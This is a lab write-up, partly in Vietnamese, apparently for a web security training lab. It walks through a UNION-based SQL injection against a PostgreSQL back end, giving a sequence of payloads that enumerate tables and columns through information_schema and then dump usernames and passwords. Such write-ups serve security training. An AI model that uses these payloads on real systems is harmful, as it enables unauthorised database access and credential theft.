# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

# Overview:

Lab này ta áp dụng những kiến thức nhỏ lẻ từ các lab trước để làm.Theo đề bài nói là `non-Oracle` vậy nghĩa là đã loại bớt 1 trường hợp, còn 2 trường hợp là `MySQL` và `Microsoft` 

Ta sử dụng payload thích hợp để lấy thông tin username và password của tất cả user.

Form của lab

![image](https://user-images.githubusercontent.com/115911041/232262144-8bd945d5-f136-4ac0-8746-7a46f69768c9.png)

# Solution:

Xác dịnh số column

`'+UNION+SELECT+'a','b'--`

![image](https://user-images.githubusercontent.com/115911041/232262208-1ae6a3a8-04e0-41d7-9041-c51432bdfa69.png)

Vậy có 2 columns. Kế đó ta cần xác định version của database, để tiết kiệm thời gian thì mình đã thử hết 3 version và đó là `PostgreSQL`

`'+UNION+SELECT+version(),NULL--`

![image](https://user-images.githubusercontent.com/115911041/232262499-933be91c-f711-46c4-9c3d-a9b2c542c135.png)

Bước tiếp theo output danh sách của table names trong database.

![image](https://user-images.githubusercontent.com/115911041/232262545-dbe2cd8d-38d0-4e69-939f-8adf6a5a41a8.png)

`'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`

![image](https://user-images.githubusercontent.com/115911041/232262612-ffdcead1-b2c2-4f8a-993c-0ab717e21c5a.png)

Và ta đã có `users=zmmsrr`.Tiếp theo output column names của table.

`'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zmmsrr'--`

![image](https://user-images.githubusercontent.com/115911041/232262948-1c7fc9cd-f3ff-4e5a-9251-4ff061600fb5.png)

`username_cggzdc
 password_tctxok`
 
 Cuối cùng ta chỉ cần output username và password của administrator theo yêu cầu của bài
 
 `'+UNION+SELECT+username_cggzdc,password_tctxok+FROM+users_zmmsrr--`
 
 ![image](https://user-images.githubusercontent.com/115911041/232263043-d023594f-1d49-42f2-981c-8df35cbeccc3.png)

